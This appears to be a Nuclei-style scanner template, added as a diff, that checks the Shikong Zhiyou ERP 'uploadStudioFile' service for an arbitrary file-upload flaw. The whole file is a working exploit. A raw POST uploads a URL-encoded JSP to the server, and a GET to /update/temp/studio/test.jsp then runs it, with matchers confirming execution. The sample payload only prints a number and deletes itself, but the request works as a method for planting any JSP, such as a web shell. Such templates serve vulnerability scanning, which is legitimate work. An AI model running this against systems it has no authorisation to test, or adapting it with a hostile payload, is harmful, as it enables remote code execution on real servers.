@@ -1,0 +1,37 @@
+id: ShikongERP-uploadStudioFile-fileupload
+
+info:
+  name: 时空智友 ERP uploadstudiofile 文件上传
+  author: god
+  severity: high
+  description: 时空智友 ERP uploadstudiofile 文件上传
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /formservice?service=updater.uploadStudioFile HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip
+    Content-Length: 613
+
+    content=<?xml%20version="1.0"?><root><filename>test.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6f%75%74%2e%70%72%69%6e%74%28%22%3c%70%72%65%3e%22%29%3b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%31%31%31%20%2a%20%31%31%31%29%3b%6f%75%74%2e%70%72%69%6e%74%28%22%3c%2f%70%72%65%3e%22%29%3b%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%0d%0a%25%3e%0d%0a-->
+
+  - |+
+    @timeout: 30s
+    GET /update/temp/studio/test.jsp HTTP/1.1
+    Host: {{Hostname}}
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "12321")'  
+        condition: and
+
